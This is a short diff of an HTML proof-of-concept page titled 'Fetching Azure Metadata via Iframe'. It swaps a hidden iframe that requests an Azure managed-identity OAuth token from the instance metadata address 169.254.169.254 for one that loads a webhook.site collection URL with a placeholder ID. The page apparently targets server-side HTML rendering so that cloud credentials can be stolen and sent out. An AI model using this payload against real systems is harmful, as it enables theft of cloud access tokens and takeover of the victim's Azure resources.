@@ -5,7 +5,7 @@
   <body>
     <h1>Fetching Azure Metadata via Iframe</h1>
     <p>Attempting to fetch Azure metadata...</p>
-    <iframe id="azureIframe" src="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" style="display:none;"></iframe>
+    <iframe id="azureIframe" src="https://webhook.site/[YOUR_WEBHOOK_ID]" style="display:none;"></iframe>
     <p id="result">Iframe response will appear here...</p>
     <script>
       const iframe = document.getElementById('azureIframe');
